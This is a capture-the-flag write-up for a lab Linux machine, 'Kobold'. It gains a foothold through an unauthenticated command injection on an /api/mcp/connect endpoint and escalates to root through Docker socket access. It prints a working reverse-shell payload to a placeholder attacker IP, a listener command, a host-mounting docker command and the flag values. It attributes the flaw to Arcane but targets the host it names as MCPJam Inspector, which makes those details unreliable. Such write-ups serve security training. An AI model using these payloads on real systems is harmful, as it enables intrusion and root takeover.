
**Difficulty:** Medium | **OS:** Linux | **Date:** March 2026

---

## Summary

Kobold involves exploiting an unauthenticated command injection vulnerability (CVE-2026-23520) in the Arcane Docker Management interface to gain a foothold as `ben`, followed by a Docker socket escape via group membership to read the root flag.

---

## Reconnaissance

```bash
rustscan -a 10.129.16.19 -- -sC -sV -T4
```

**Open ports:**

|Port|Service|Notes|
|---|---|---|
|22|OpenSSH 9.6p1|Ubuntu|
|80|nginx 1.24.0|Redirects → `https://kobold.htb`|
|443|nginx 1.24.0 (SSL)|Main web app; wildcard cert `*.kobold.htb`|
|3552|Arcane Docker Mgmt v1.13.0|SvelteKit frontend|

---

## Enumeration

### /etc/hosts

```
10.129.16.19  kobold.htb  mcp.kobold.htb  bin.kobold.htb
```

### Subdomain Discovery

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://kobold.htb/ -H "Host: FUZZ.kobold.htb" -fw 4 -k -t 100
```

**Results:**

- `mcp.kobold.htb` — MCPJam Inspector v1.4.2 (MCP server development UI)
- `bin.kobold.htb` — PrivateBin instance

### API Discovery

Querying the Arcane OpenAPI spec:

```bash
curl -sk https://mcp.kobold.htb/api/openapi.json | python3 -m json.tool
```

Reveals the vulnerable endpoint: **`/api/mcp/connect`**

---

## Foothold — CVE-2026-23520 (Command Injection)

Arcane Docker Management v1.13.0 passes the `serverConfig.command` parameter directly to a shell without sanitization, allowing unauthenticated RCE.

**Listener:**

```bash
nc -lvnp 4444
```

**Payload:**

```bash
curl -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "exploit",
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"],
      "env": {}
    }
  }'
```

Reverse shell lands as **`ben`** (uid=1001).

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## User Flag

```bash
cat /home/ben/user.txt
```

```
4a4c73ee0dc1f7ad8602a6977702d2a0
```

---

## Privilege Escalation — Docker Socket Escape

Checking group membership:

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

The `operator` group has access to the Docker socket. Switching into the docker group and mounting the host filesystem into a container:

```bash
newgrp docker
docker run -v /:/hostfs --rm --user root \
  --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
```

This works because any user who can communicate with `dockerd` can mount the host filesystem and read arbitrary files as root inside the container.

---

## Root Flag

```
50d7034f7886e8404e1d2bd0c6ea4be8
```

---

## Kill Chain

```
RustScan → subdomain enum (mcp.kobold.htb)
  → CVE-2026-23520 command injection on /api/mcp/connect
    → shell as ben
      → operator group → docker socket access
        → docker -v /:/hostfs → root.txt
```

---

## Key Takeaways

- Wildcard TLS certs (`*.kobold.htb`) are a strong indicator of vhost enumeration being required.
- MCP (Model Context Protocol) servers expose tool-execution endpoints — always check for unauthenticated command passthrough.
- Docker group membership is equivalent to root. The `operator` group being aliased to docker access is a subtle but classic misconfiguration.